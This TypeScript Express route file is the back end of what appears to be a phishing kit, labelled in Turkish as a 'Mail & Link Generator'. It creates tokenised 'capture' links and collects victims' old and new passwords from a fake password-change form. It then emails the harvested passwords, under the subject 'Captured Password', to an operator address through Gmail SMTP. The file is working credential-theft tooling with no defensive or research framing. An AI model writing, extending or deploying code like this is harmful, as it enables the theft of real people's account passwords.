import { Router, type IRouter } from "express";
import { randomUUID } from "crypto";
import nodemailer from "nodemailer";
import { db, sessionsTable } from "@workspace/db";
import { eq } from "drizzle-orm";
import {
  CreateSessionBody,
  SubmitCaptureBody,
  GetSessionParams,
  SubmitCaptureParams,
} from "@workspace/api-zod";

const router: IRouter = Router();

function getCaptureUrl(token: string): string {
  const domains = process.env["REPLIT_DOMAINS"];
  const base = domains ? `https://${domains.split(",")[0]}` : "http://localhost";
  return `${base}/?token=${token}`;
}

async function sendEmail(
  senderEmail: string,
  senderPassword: string,
  toEmail: string,
  subject: string,
  html: string,
): Promise<void> {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: senderEmail,
      pass: senderPassword,
    },
  });

  await transporter.sendMail({
    from: senderEmail,
    to: toEmail,
    subject,
    html,
  });
}

router.post("/sessions", async (req, res) => {
  const parsed = CreateSessionBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: parsed.error.message });
    return;
  }

  const { senderEmail, senderPassword, resultEmail, messageSubject } = parsed.data;
  const token = randomUUID();

  await db.insert(sessionsTable).values({
    token,
    senderEmail,
    senderPassword,
    resultEmail,
    messageSubject,
  });

  const captureUrl = getCaptureUrl(token);

  res.status(201).json({
    token,
    captureUrl,
    createdAt: new Date().toISOString(),
  });
});

router.get("/sessions/:token", async (req, res) => {
  const params = GetSessionParams.safeParse(req.params);
  if (!params.success) {
    res.status(400).json({ error: "Invalid token" });
    return;
  }

  const session = await db
    .select()
    .from(sessionsTable)
    .where(eq(sessionsTable.token, params.data.token))
    .limit(1);

  if (session.length === 0) {
    res.status(404).json({ error: "Session not found" });
    return;
  }

  res.json({
    token: session[0].token,
    messageSubject: session[0].messageSubject,
    exists: true,
    used: session[0].used,
  });
});

router.post("/sessions/:token/submit", async (req, res) => {
  const params = SubmitCaptureParams.safeParse(req.params);
  if (!params.success) {
    res.status(400).json({ error: "Invalid token" });
    return;
  }

  const body = SubmitCaptureBody.safeParse(req.body);
  if (!body.success) {
    res.status(400).json({ error: body.error.message });
    return;
  }

  const session = await db
    .select()
    .from(sessionsTable)
    .where(eq(sessionsTable.token, params.data.token))
    .limit(1);

  if (session.length === 0) {
    res.status(404).json({ error: "Session not found" });
    return;
  }

  const { senderEmail, senderPassword, resultEmail, messageSubject } = session[0];
  const { oldPassword, newPassword } = body.data;

  const html = `
    <h2>Parola Yakalandı</h2>
    <p><strong>Konu:</strong> ${messageSubject}</p>
    <hr/>
    <p><strong>Eski Şifre:</strong> ${oldPassword}</p>
    <p><strong>Yeni Şifre:</strong> ${newPassword}</p>
    <hr/>
    <p><em>Mail & Link Generator tarafından gönderildi.</em></p>
  `;

  try {
    await sendEmail(
      senderEmail,
      senderPassword,
      resultEmail,
      `Yakalanan Parola: ${messageSubject}`,
      html,
    );

    await db
      .update(sessionsTable)
      .set({ used: true })
      .where(eq(sessionsTable.token, params.data.token));

    res.json({ success: true, message: "Bilgiler başarıyla iletildi." });
  } catch (err) {
    req.log.error({ err }, "Failed to send capture email");
    res.status(500).json({ error: "E-posta gönderilemedi." });
  }
});

export default router;
